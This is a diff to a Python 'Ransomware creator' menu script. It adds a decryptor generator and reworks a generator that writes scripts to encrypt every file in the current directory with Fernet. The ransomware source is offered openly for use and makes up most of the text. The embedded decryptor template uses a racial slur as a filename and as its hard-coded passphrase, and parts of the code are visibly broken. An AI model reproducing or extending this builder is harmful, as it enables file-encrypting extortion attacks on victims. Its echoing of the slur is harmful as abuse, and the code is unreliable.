@@ -49,17 +49,72 @@ time.sleep(0.5)
 mtxt = "	Menu: "
 ipap(mtxt)
 
-print("\n \n [1] Ransomware creator \n [2] About the code \n [00] Exit \n")
+print("\n \n [1] Ransomware creator \n [2] Descrypt creator \n [3] About the code \n [00] Exit \n")
 
 def mendu():
-  menu = int(input(" RC: "))
-  if menu == 00:
-     ipap(gb)
-     exit()
-  elif menu == 2:
-     ipap(about)
-     mendu()
-  elif menu == 1:
+    menu = int(input(" RC: "))
+    if menu == 00:
+        ipap(gb)
+        exit()
+    elif menu == 3:
+        ipap(about)
+        mendu()
+    elif menu == 2:
+        # Ejecutar el código de descifrado aquí
+        import os
+
+        decrypt = ''' 
+ 
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+         if file == "thekey.key" or file == "decrypt.py" or file == "nigger":
+            continue
+if os.path.isfile(file):
+             files.append(file)
+print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "rb") as key:
+    secretkey = key.read()
+
+frasesecreta = "keynigger"
+
+frase_usuario = input("Input the decryption key: ")
+
+if frase_usuario == frasesecreta:
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+    contents_decrypted = Fernet(secretkey).decrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_decrypted)
+    print("Congratulations, files decrypted successfully!")
+else:
+    print("Nah incorrect key")
+        '''
+
+        folder_path = "rade"
+
+        # Comprueba si la carpeta existe, y si no, la crea
+        if not os.path.exists(folder_path):
+            os.makedirs(folder_path)
+        
+        pene = input("Choose the decryption key: ")
+        miass = input("Ransomware Name: ")
+        name = input("Choose the decrypt file name: ")
+
+        with open("rade/" + name + ".py", "w") as f:
+            f.write(decrypt.format(miass, pene))
+
+        # Volver al menú después de ejecutar el código de descifrado
+        mendu()
+
+    elif menu == 1:
          code = '''\
 import os
 from cryptography.fernet import Fernet
@@ -67,7 +122,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-    if file == "main.py" or file == "thekey.key" or file == "decrypt.py" or file == nombre "{}":
+    if file == "{}" or file == "thekey.key" or file == "decrypt.py" or file == "{}":
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -86,17 +141,18 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 print("Your files has been encripted!!")
+
+
+
 '''
-  folder_path = "ransomwares"
+
 
 # Comprueba si la carpeta existe, y si no, la crea
-  if not os.path.exists(folder_path):
-    os.makedirs(folder_path)
-  
-  word = input("Choose the ransomware name: ")
 
-  with open("ransomwares/" + word + ".py", "w") as f:
-      f.write(code.replace('nombre "{}"', '"{}.py"'.format(word)))
+    word = input("Choose the ransomware name: ")
+    delip = input("Decrypt files name: ")
+
+    with open("rade/" + word + ".py", "w") as f:
+      f.write(code.format(word + ".py", delip + ".py"))
 mendu()
-
 
